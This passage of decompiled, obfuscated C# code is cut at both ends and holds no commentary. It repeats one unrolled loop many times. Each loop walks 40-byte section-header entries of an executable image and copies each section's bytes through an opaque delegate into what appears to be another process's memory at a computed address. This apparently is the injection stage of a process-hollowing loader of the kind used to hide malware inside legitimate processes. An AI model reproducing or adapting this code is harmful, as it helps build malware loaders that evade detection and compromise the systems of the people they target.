					}
					((byte*)ptr)[3637] = ((*(int*)((byte*)ptr + 160) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3637] != 0)
					{
						byte[] array12;
						checked
						{
							array12 = new byte[*unchecked((int*)((byte*)ptr + 160)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 164), array12, 0, array12.Length);
						((byte*)ptr)[3638] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 156))), array12, array12.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3638] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3642] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3642] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 168)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 172)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 176)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3640] = ((*(int*)((byte*)ptr + 172) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3640] != 0)
					{
						byte[] array13;
						checked
						{
							array13 = new byte[*unchecked((int*)((byte*)ptr + 172)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 176), array13, 0, array13.Length);
						((byte*)ptr)[3641] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 168))), array13, array13.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3641] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3645] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3645] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 180)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 184)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 188)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3643] = ((*(int*)((byte*)ptr + 184) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3643] != 0)
					{
						byte[] array14;
						checked
						{
							array14 = new byte[*unchecked((int*)((byte*)ptr + 184)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 188), array14, 0, array14.Length);
						((byte*)ptr)[3644] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 180))), array14, array14.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3644] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3648] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3648] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 192)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 196)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 200)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3646] = ((*(int*)((byte*)ptr + 196) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3646] != 0)
					{
						byte[] array15;
						checked
						{
							array15 = new byte[*unchecked((int*)((byte*)ptr + 196)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 200), array15, 0, array15.Length);
						((byte*)ptr)[3647] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 192))), array15, array15.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3647] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3651] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3651] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 204)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 208)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 212)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3649] = ((*(int*)((byte*)ptr + 208) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3649] != 0)
					{
						byte[] array16;
						checked
						{
							array16 = new byte[*unchecked((int*)((byte*)ptr + 208)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 212), array16, 0, array16.Length);
						((byte*)ptr)[3650] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 204))), array16, array16.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3650] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3654] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3654] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 216)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 220)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 224)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3652] = ((*(int*)((byte*)ptr + 220) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3652] != 0)
					{
						byte[] array17;
						checked
						{
							array17 = new byte[*unchecked((int*)((byte*)ptr + 220)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 224), array17, 0, array17.Length);
						((byte*)ptr)[3653] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 216))), array17, array17.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3653] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3657] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3657] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 228)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 232)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 236)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3655] = ((*(int*)((byte*)ptr + 232) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3655] != 0)
					{
						byte[] array18;
						checked
						{
							array18 = new byte[*unchecked((int*)((byte*)ptr + 232)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 236), array18, 0, array18.Length);
						((byte*)ptr)[3656] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 228))), array18, array18.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3656] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3660] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3660] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 240)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 244)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 248)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3658] = ((*(int*)((byte*)ptr + 244) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3658] != 0)
					{
						byte[] array19;
						checked
						{
							array19 = new byte[*unchecked((int*)((byte*)ptr + 244)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 248), array19, 0, array19.Length);
						((byte*)ptr)[3659] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 240))), array19, array19.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3659] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3663] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3663] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 252)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 256)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 260)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3661] = ((*(int*)((byte*)ptr + 256) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3661] != 0)
					{
						byte[] array20;
						checked
						{
							array20 = new byte[*unchecked((int*)((byte*)ptr + 256)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 260), array20, 0, array20.Length);
						((byte*)ptr)[3662] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 252))), array20, array20.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3662] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3666] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3666] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 264)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 268)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 272)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3664] = ((*(int*)((byte*)ptr + 268) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3664] != 0)
					{
						byte[] array21;
						checked
						{
							array21 = new byte[*unchecked((int*)((byte*)ptr + 268)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 272), array21, 0, array21.Length);
						((byte*)ptr)[3665] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 264))), array21, array21.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3665] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3669] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3669] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 276)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 280)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 284)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3667] = ((*(int*)((byte*)ptr + 280) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3667] != 0)
					{
						byte[] array22;
						checked
						{
							array22 = new byte[*unchecked((int*)((byte*)ptr + 280)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 284), array22, 0, array22.Length);
						((byte*)ptr)[3668] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 276))), array22, array22.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3668] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3672] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3672] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 288)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 292)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 296)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3670] = ((*(int*)((byte*)ptr + 292) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3670] != 0)
					{
						byte[] array23;
						checked
						{
							array23 = new byte[*unchecked((int*)((byte*)ptr + 292)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 296), array23, 0, array23.Length);
						((byte*)ptr)[3671] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 288))), array23, array23.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3671] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3675] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3675] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 300)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 304)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 308)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3673] = ((*(int*)((byte*)ptr + 304) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3673] != 0)
					{
						byte[] array24;
						checked
						{
							array24 = new byte[*unchecked((int*)((byte*)ptr + 304)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 308), array24, 0, array24.Length);
						((byte*)ptr)[3674] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 300))), array24, array24.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3674] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3678] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3678] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 312)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 316)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 320)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3676] = ((*(int*)((byte*)ptr + 316) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3676] != 0)
					{
						byte[] array25;
						checked
						{
							array25 = new byte[*unchecked((int*)((byte*)ptr + 316)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 320), array25, 0, array25.Length);
						((byte*)ptr)[3677] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 312))), array25, array25.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3677] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3681] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3681] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 324)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 328)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 332)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3679] = ((*(int*)((byte*)ptr + 328) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3679] != 0)
					{
						byte[] array26;
						checked
						{
							array26 = new byte[*unchecked((int*)((byte*)ptr + 328)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 332), array26, 0, array26.Length);
						((byte*)ptr)[3680] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 324))), array26, array26.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3680] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3684] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3684] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 336)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 340)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 344)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3682] = ((*(int*)((byte*)ptr + 340) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3682] != 0)
					{
						byte[] array27;
						checked
						{
							array27 = new byte[*unchecked((int*)((byte*)ptr + 340)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 344), array27, 0, array27.Length);
						((byte*)ptr)[3683] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 336))), array27, array27.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3683] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3687] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3687] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 348)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 352)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 356)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3685] = ((*(int*)((byte*)ptr + 352) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3685] != 0)
					{
						byte[] array28;
						checked
						{
							array28 = new byte[*unchecked((int*)((byte*)ptr + 352)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 356), array28, 0, array28.Length);
						((byte*)ptr)[3686] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 348))), array28, array28.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3686] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3690] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3690] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 360)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 364)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 368)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3688] = ((*(int*)((byte*)ptr + 364) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3688] != 0)
					{
						byte[] array29;
						checked
						{
							array29 = new byte[*unchecked((int*)((byte*)ptr + 364)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 368), array29, 0, array29.Length);
						((byte*)ptr)[3689] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 360))), array29, array29.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3689] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3693] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3693] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 372)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 376)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 380)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3691] = ((*(int*)((byte*)ptr + 376) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3691] != 0)
					{
						byte[] array30;
						checked
						{
							array30 = new byte[*unchecked((int*)((byte*)ptr + 376)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 380), array30, 0, array30.Length);
						((byte*)ptr)[3692] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 372))), array30, array30.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3692] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3696] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3696] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 384)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 388)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 392)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3694] = ((*(int*)((byte*)ptr + 388) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3694] != 0)
					{
						byte[] array31;
						checked
						{
							array31 = new byte[*unchecked((int*)((byte*)ptr + 388)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 392), array31, 0, array31.Length);
